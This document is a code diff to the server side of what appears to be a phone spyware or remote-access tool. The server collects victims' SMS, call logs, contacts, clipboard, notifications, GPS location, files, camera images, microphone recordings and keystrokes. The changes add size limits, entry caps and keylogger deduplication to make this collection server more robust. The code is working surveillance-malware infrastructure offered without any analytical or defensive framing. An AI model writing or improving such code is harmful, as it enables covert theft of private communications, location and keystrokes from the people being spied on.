@@ -42,6 +42,9 @@ const REALTIME_COMMANDS = new Set<CmdType>([
 const SESSION_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;
 const DEVICE_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;
 
+const MAX_CHUNK_BASE64_LENGTH = 67_108_864; // ~64 MB encoded, ~48 MB decoded
+const MAX_TOTAL_CHUNKS = 10000;
+
 function readSessionId(value: unknown): string | null {
   return typeof value === 'string' && SESSION_ID_PATTERN.test(value) ? value : null;
 }
@@ -232,7 +235,7 @@ class SocketService {
 
   private ensureClientData(clientId: string): void {
     const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'gps_error', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger', 'keylogger_status', 'keylogger_log_info'];
-    for (const type of dataTypes) dbHelpers.getOrCreateClientData(clientId, type);
+    dbHelpers.ensureClientDataBatch(clientId, dataTypes);
   }
 
   private saveFileToDb(clientId: string, fileType: string, buffer: Buffer, originalName: string): void {
@@ -316,7 +319,14 @@ class SocketService {
 
         if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
           const errMsg = data.error || 'No location';
-          const diagnostics = data.diagnostics && typeof data.diagnostics === 'object' ? data.diagnostics : null;
+          // Sanitize diagnostics: only keep provider & status fields; discard PII/tower/raw data.
+          const rawDiag = data.diagnostics && typeof data.diagnostics === 'object' ? data.diagnostics : null;
+          const diagnostics = rawDiag ? {
+            provider: rawDiag.provider || null,
+            status: rawDiag.status || null,
+            enabled: rawDiag.enabled ?? null,
+            interval: rawDiag.interval ?? null,
+          } : null;
           dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${errMsg}`, diagnostics ? JSON.stringify(diagnostics) : undefined);
           dbHelpers.setClientData(id, 'gps_error', JSON.stringify({
             error: errMsg,
@@ -355,6 +365,10 @@ class SocketService {
           time: timeValue,
         };
         gpsData.push(entry);
+        // Cap GPS entries at 10 000 to prevent unbounded growth
+        if (gpsData.length > 10000) {
+          gpsData.splice(0, gpsData.length - 10000);
+        }
         dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
         dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({
           lat: latitude,
@@ -399,6 +413,10 @@ class SocketService {
             ongoing: notification.ongoing, clearable: notification.clearable,
             category: notification.category, initial: notification.initial,
           });
+          // Cap at 10 000 entries
+          if (notifications.length > 10000) {
+            notifications.splice(0, notifications.length - 10000);
+          }
           dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications));
           dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification from ${id}`);
           broadcastData('notifications');
@@ -413,6 +431,10 @@ class SocketService {
       try {
         const clipboard = JSON.parse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
         clipboard.push({ text: data.text, length: data.length, label: data.label, mimeType: data.mimeType, timestamp: data.timestamp || new Date().toISOString() });
+        // Cap at 10 000 entries
+        if (clipboard.length > 10000) {
+          clipboard.splice(0, clipboard.length - 10000);
+        }
         dbHelpers.setClientData(id, 'clipboard', JSON.stringify(clipboard));
         dbHelpers.addLog('DATA', 'CLIPBOARD', `Clipboard data from ${id}`);
         broadcastData('clipboard');
@@ -481,6 +503,10 @@ class SocketService {
           dbHelpers.addLog('DATA', 'CAMERA', `Camera list from ${id}`, JSON.stringify({ count: data.list?.length }));
           broadcastData('camera');
         } else if (data.type === 'download_start') {
+          if (typeof data.totalChunks !== 'number' || data.totalChunks > MAX_TOTAL_CHUNKS) {
+            log.warn(`[Socket] Camera transfer rejected from ${id}: totalChunks=${data.totalChunks}`);
+            return;
+          }
           this.transfers.set(`${id}:${data.transferId}`, {
             transferId: data.transferId, name: data.name || `capture_${Date.now()}.jpg`,
             channel: CMD.CAMERA, totalChunks: data.totalChunks, totalSize: data.totalSize,
@@ -491,6 +517,10 @@ class SocketService {
           const transferId = `${id}:${data.transferId}`;
           const transfer = this.transfers.get(transferId);
           if (transfer) {
+            if (typeof data.chunkData !== 'string' || data.chunkData.length > MAX_CHUNK_BASE64_LENGTH) {
+              log.warn(`[Socket] Oversized camera chunk rejected from ${id}: ${data.chunkData?.length ?? 'unknown'} bytes`);
+              return;
+            }
             transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
             const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
             this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
@@ -503,6 +533,10 @@ class SocketService {
         } else if (data.image === false && data.error) {
           dbHelpers.addLog('ERROR', 'CAMERA', `Camera error from ${id}: ${data.error}`);
         } else if (data.buffer || data.image) {
+          if (typeof data.buffer === 'string' && data.buffer.length > MAX_CHUNK_BASE64_LENGTH) {
+            log.warn(`[Socket] Oversized camera image rejected from ${id}: ${data.buffer.length} bytes`);
+            return;
+          }
           const buffer = Buffer.from(data.buffer, 'base64');
           const fileName = data.name || `capture_${Date.now()}.jpg`;
           this.saveFileToDb(id, 'photo', buffer, fileName);
@@ -523,11 +557,19 @@ class SocketService {
           dbHelpers.addLog('DATA', 'FILES', `File list from ${id}`, JSON.stringify({ path: data.path, count: normalizedList.length }));
           broadcastData('files');
         } else if (data.type === 'download') {
+          if (typeof data.buffer !== 'string' || data.buffer.length > MAX_CHUNK_BASE64_LENGTH) {
+            log.warn(`[Socket] Oversized file download rejected from ${id}: ${data.buffer?.length ?? 'unknown'} bytes`);
+            return;
+          }
           const buffer = Buffer.from(data.buffer, 'base64');
           this.saveFileToDb(id, 'download', buffer, data.name || 'download');
           dbHelpers.addLog('DATA', 'FILES', `File downloaded from ${id}: ${data.name}`, JSON.stringify({ size: buffer.length }));
           broadcastData('files');
         } else if (data.type === 'download_start') {
+          if (typeof data.totalChunks !== 'number' || data.totalChunks > MAX_TOTAL_CHUNKS) {
+            log.warn(`[Socket] File transfer rejected from ${id}: totalChunks=${data.totalChunks}`);
+            return;
+          }
           this.transfers.set(`${id}:${data.transferId}`, {
             transferId: data.transferId, name: data.name, path: data.path,
             channel: CMD.FILES, totalChunks: data.totalChunks, totalSize: data.totalSize,
@@ -538,6 +580,10 @@ class SocketService {
           const transferId = `${id}:${data.transferId}`;
           const transfer = this.transfers.get(transferId);
           if (transfer) {
+            if (typeof data.chunkData !== 'string' || data.chunkData.length > MAX_CHUNK_BASE64_LENGTH) {
+              log.warn(`[Socket] Oversized file chunk rejected from ${id}: ${data.chunkData?.length ?? 'unknown'} bytes`);
+              return;
+            }
             transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
             const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
             this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
@@ -562,6 +608,10 @@ class SocketService {
     socket.on(CMD.MIC, (data: any) => {
       try {
         if (data.type === 'download_start') {
+          if (typeof data.totalChunks !== 'number' || data.totalChunks > MAX_TOTAL_CHUNKS) {
+            log.warn(`[Socket] Mic transfer rejected from ${id}: totalChunks=${data.totalChunks}`);
+            return;
+          }
           this.transfers.set(`${id}:${data.transferId}`, {
             transferId: data.transferId, name: data.name || `recording_${Date.now()}.mp4`,
             channel: CMD.MIC, totalChunks: data.totalChunks, totalSize: data.totalSize,
@@ -572,6 +622,10 @@ class SocketService {
           const transferId = `${id}:${data.transferId}`;
           const transfer = this.transfers.get(transferId);
           if (transfer) {
+            if (typeof data.chunkData !== 'string' || data.chunkData.length > MAX_CHUNK_BASE64_LENGTH) {
+              log.warn(`[Socket] Oversized mic chunk rejected from ${id}: ${data.chunkData?.length ?? 'unknown'} bytes`);
+              return;
+            }
             transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
             const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
             this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
@@ -582,6 +636,10 @@ class SocketService {
         } else if (data.type === 'download_end') {
           this.transfers.delete(`${id}:${data.transferId}`);
         } else if (data.file) {
+          if (typeof data.buffer !== 'string' || data.buffer.length > MAX_CHUNK_BASE64_LENGTH) {
+            log.warn(`[Socket] Oversized mic recording rejected from ${id}: ${data.buffer?.length ?? 'unknown'} bytes`);
+            return;
+          }
           const buffer = Buffer.from(data.buffer, 'base64');
           this.saveFileToDb(id, 'recording', buffer, data.name || `recording_${Date.now()}.mp4`);
           dbHelpers.addLog('DATA', 'MIC', `Recording from ${id}`, JSON.stringify({ size: buffer.length, name: data.name }));
@@ -640,7 +698,12 @@ class SocketService {
 
         // ── getQueued response: { action: 'getQueued', totalQueued: number } ──
         if (data.action === 'getQueued') {
-          const queuedInfo = { queued: data.totalQueued ?? data.queued ?? 0, checkedAt: new Date().toISOString() };
+          const prevStatus = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger_status'));
+          const queuedInfo = {
+            enabled: prevStatus?.enabled ?? null,
+            queued: data.totalQueued ?? data.queued ?? 0,
+            checkedAt: new Date().toISOString(),
+          };
           dbHelpers.setClientData(id, 'keylogger_status', JSON.stringify(queuedInfo));
           broadcastData('keylogger_status');
           return;
@@ -656,6 +719,7 @@ class SocketService {
 
         // ── clearSynced response: { action: 'clearSynced', success: boolean } ──
         if (data.action === 'clearSynced') {
+          dbHelpers.setClientData(id, 'keylogger', '[]');
           dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger synced data cleared on ${id}`, '');
           broadcastData('keylogger');
           return;
@@ -664,7 +728,15 @@ class SocketService {
         // ── getHistory response: { action: 'getHistory', history: [...], total: number } ──
         if (data.history && Array.isArray(data.history)) {
           const existing = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
+          // Dedup: bỏ qua entry đã tồn tại (dùng DB row id)
+          const seenIds = new Set<number>();
+          for (const e of existing) {
+            if (e._dbId != null) seenIds.add(e._dbId as number);
+          }
           for (const item of data.history) {
+            const dbId = item.id != null ? Number(item.id) : null;
+            if (dbId != null && seenIds.has(dbId)) continue;
+            if (dbId != null) seenIds.add(dbId);
             existing.push({
               type: 'history',
               eventType: item.eventType || '',
@@ -674,6 +746,7 @@ class SocketService {
               text: item.txt || item.text || '',
               extra: item.extra || '',
               timestamp: item.ts || data.timestamp || new Date().toISOString(),
+              _dbId: dbId,
             });
           }
           if (existing.length > 10000) {
@@ -690,6 +763,11 @@ class SocketService {
 
         // ── Live + offline batch (standard flush) ──
         const existing = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
+        // Dedup set: tránh trùng lặp khi client re-flush cùng một entry (dùng DB row id)
+        const seenIds = new Set<number>();
+        for (const e of existing) {
+          if (e._dbId != null) seenIds.add(e._dbId as number);
+        }
 
         // Live entries: now sent as array of structured objects
         if (data.live && Array.isArray(data.live)) {
@@ -712,6 +790,10 @@ class SocketService {
 
         if (data.offlineBatch && Array.isArray(data.offlineBatch)) {
           for (const item of data.offlineBatch) {
+            const dbId = item.id != null ? Number(item.id) : null;
+            // Bỏ qua entry đã tồn tại (trùng DB row id)
+            if (dbId != null && seenIds.has(dbId)) continue;
+            if (dbId != null) seenIds.add(dbId);
             existing.push({
               type: 'offline',
               eventType: item.eventType || '',
@@ -721,6 +803,7 @@ class SocketService {
               text: item.txt || item.text || '',
               extra: item.extra || '',
               timestamp: item.ts || data.timestamp || new Date().toISOString(),
+              _dbId: dbId,
             });
           }
         }
